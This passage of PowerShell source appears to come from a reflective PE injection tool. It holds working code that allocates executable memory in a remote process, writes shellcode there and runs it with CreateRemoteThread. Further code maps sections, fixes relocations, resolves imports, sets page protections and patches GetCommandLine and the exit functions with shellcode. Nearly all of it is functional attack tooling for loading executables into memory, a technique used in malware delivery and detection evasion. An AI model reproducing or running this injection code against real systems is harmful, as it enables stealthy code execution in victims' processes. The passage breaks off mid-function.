        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC4.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($GetProcAddressRetMem, $SCPSMem, $false)
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($PtrSize)
        Write-BytesToMemory -Bytes $GetProcAddressSC5 -MemoryAddress $SCPSMem
        $SCPSMem = Add-SignedIntAsUnsigned $SCPSMem ($GetProcAddressSC5.Length)
        
        $RSCAddr = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, [IntPtr]::Zero, [UIntPtr][UInt64]$SCLength, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($RSCAddr -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        [UIntPtr]$NumBytesWritten = [UIntPtr]::Zero
        $Success = $Win32Functions.WriteProcessMemory.Invoke($RemoteProcHandle, $RSCAddr, $SCPSMemOriginal, [UIntPtr][UInt64]$SCLength, [Ref]$NumBytesWritten)
        if (($Success -eq $false) -or ([UInt64]$NumBytesWritten -ne [UInt64]$SCLength))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $RThreadHandle = Create-RemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $RSCAddr -Win32Functions $Win32Functions
        $Result = $Win32Functions.WaitForSingleObject.Invoke($RThreadHandle, 20000)
        if ($Result -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        #The process address is written to memory in the remote process at address $GetProcAddressRetMem, read this memory
        [IntPtr]$ReturnValMem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
        $Result = $Win32Functions.ReadProcessMemory.Invoke($RemoteProcHandle, $GetProcAddressRetMem, $ReturnValMem, [UIntPtr][UInt64]$PtrSize, [Ref]$NumBytesWritten)
        if (($Result -eq $false) -or ($NumBytesWritten -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$ProcAddress = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ReturnValMem, [Type][IntPtr])

        #Cleanup remote process memory
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RSCAddr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $GetProcAddressRetMem, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null

        if (-not $LoadByOrdinal)
        {
            $Win32Functions.VirtualFreeEx.Invoke($RemoteProcHandle, $RFuncNamePtr, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        
        return $ProcAddress
    }


    Function Copy-Sections
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $PEBytes,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
        
            #Address to copy the section to
            [IntPtr]$SectionDestAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$SectionHeader.VirtualAddress))
            
            #SizeOfRawData is the size of the data on disk, VirtualSize is the minimum space that can be allocated
            # in memory for the section. If VirtualSize > SizeOfRawData, pad the extra spaces with 0. If
            # SizeOfRawData > VirtualSize, it is because the section stored on disk has padding that we can throw away,
            # so truncate SizeOfRawData to VirtualSize
            $SizeOfRawData = $SectionHeader.SizeOfRawData

            if ($SectionHeader.PointerToRawData -eq 0)
            {
                $SizeOfRawData = 0
            }
            
            if ($SizeOfRawData -gt $SectionHeader.VirtualSize)
            {
                $SizeOfRawData = $SectionHeader.VirtualSize
            }
            
            if ($SizeOfRawData -gt 0)
            {
                Test-MemoryRangeValid -DebugString "Copy-Sections::MarshalCopy" -PEInfo $PEInfo -StartAddress $SectionDestAddr -Size $SizeOfRawData | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, [Int32]$SectionHeader.PointerToRawData, $SectionDestAddr, $SizeOfRawData)
            }
        
            #If SizeOfRawData is less than VirtualSize, set memory to 0 for the extra space
            if ($SectionHeader.SizeOfRawData -lt $SectionHeader.VirtualSize)
            {
                $Difference = $SectionHeader.VirtualSize - $SizeOfRawData
                [IntPtr]$StartAddress = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$SectionDestAddr) ([Int64]$SizeOfRawData))
                Test-MemoryRangeValid -DebugString "Copy-Sections::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $Difference | Out-Null
                $Win32Functions.memset.Invoke($StartAddress, 0, [IntPtr]$Difference) | Out-Null
            }
        }
    }


    Function Update-MemoryAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $OriginalImageBase,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        [Int64]$BaseDifference = 0
        $AddDifference = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$ImageBaseRelocSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
        
        #If the PE was loaded to its expected address or there are no entries in the BaseRelocationTable, nothing to do
        if (($OriginalImageBase -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }


        elseif ((Compare-Val1GreaterThanVal2AsUInt ($OriginalImageBase) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($OriginalImageBase) ($PEInfo.EffectivePEHandle)
            $AddDifference = $false
        }
        elseif ((Compare-Val1GreaterThanVal2AsUInt ($PEInfo.EffectivePEHandle) ($OriginalImageBase)) -eq $true)
        {
            $BaseDifference = Sub-SignedIntAsUnsigned ($PEInfo.EffectivePEHandle) ($OriginalImageBase)
        }
        
        #Use the IMAGE_BASE_RELOCATION structure to find memory addresses which need to be modified
        [IntPtr]$BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            #If SizeOfBlock == 0, we are done
            $BaseRelocationTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($BaseRelocPtr, [Type]$Win32Types.IMAGE_BASE_RELOCATION)

            if ($BaseRelocationTable.SizeOfBlock -eq 0)
            {
                break
            }

            [IntPtr]$MemAddrBase = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$BaseRelocationTable.VirtualAddress))
            $NumRelocations = ($BaseRelocationTable.SizeOfBlock - $ImageBaseRelocSize) / 2

            #Loop through each relocation
            for($i = 0; $i -lt $NumRelocations; $i++)
            {
                #Get info for this relocation
                $RelocationInfoPtr = [IntPtr](Add-SignedIntAsUnsigned ([IntPtr]$BaseRelocPtr) ([Int64]$ImageBaseRelocSize + (2 * $i)))
                [UInt16]$RelocationInfo = [System.Runtime.InteropServices.Marshal]::PtrToStructure($RelocationInfoPtr, [Type][UInt16])

                #First 4 bits is the relocation type, last 12 bits is the address offset from $MemAddrBase
                [UInt16]$RelocOffset = $RelocationInfo -band 0x0FFF
                [UInt16]$RelocType = $RelocationInfo -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $RelocType = [Math]::Floor($RelocType / 2)
                }

                #For DLL's there are two types of relocations used according to the following MSDN article. One for 64bit and one for 32bit.
                #This appears to be true for EXE's as well.
                # Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {            
                    #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                    [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                    [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
        
                    if ($AddDifference -eq $true)
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }
                    else
                    {
                        [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
                    }                

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                }
                elseif ($RelocType -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    #IMAGE_REL_BASED_ABSOLUTE is just used for padding, we don't actually do anything with it
                    Throw "Unknown relocation found, relocation value: $RelocType, relocationinfo: $RelocationInfo"
                }
            }
            
            $BaseRelocPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$BaseRelocPtr) ([Int64]$BaseRelocationTable.SizeOfBlock))
        }
    }


    Function Import-DllImports
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Types,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle
        )
        
        $RemoteLoading = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RemoteLoading = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$ImportDescriptorPtr = Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $ImportDescriptor = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ImportDescriptorPtr, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
                
                #If the structure is null, it signals that this is the end of the array
                if ($ImportDescriptor.Characteristics -eq 0 `
                        -and $ImportDescriptor.FirstThunk -eq 0 `
                        -and $ImportDescriptor.ForwarderChain -eq 0 `
                        -and $ImportDescriptor.Name -eq 0 `
                        -and $ImportDescriptor.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }

                $ImportDllHandle = [IntPtr]::Zero
                $ImportDllPathPtr = (Add-SignedIntAsUnsigned ([Int64]$PEInfo.PEHandle) ([Int64]$ImportDescriptor.Name))
                $ImportDllPath = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ImportDllPathPtr)
                
                if ($RemoteLoading -eq $true)
                {
                    $ImportDllHandle = Import-DllInRemoteProcess -RemoteProcHandle $RemoteProcHandle -ImportDllPathPtr $ImportDllPathPtr
                }
                else
                {
                    $ImportDllHandle = $Win32Functions.LoadLibrary.Invoke($ImportDllPath)
                }

                if (($ImportDllHandle -eq $null) -or ($ImportDllHandle -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }
                
                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])
                
                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    # If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    # and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }
                    
                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }
                    
                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)
                    
                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }
                
                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )
        
        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)
            
            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize
            
            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }
    
    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,
        
        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )
        
        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @() 
        
        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0
        
        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }
        
        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        # We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
    
        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48    #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8
        
        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length
        
        
        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        
        
        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }
        
        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp
        
        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################
        
        
        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        # I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        # It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        # argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")
        
        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }
                
                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
                
                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)
                
                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
                
                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################
        
        
        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process
        
        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr
        
        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
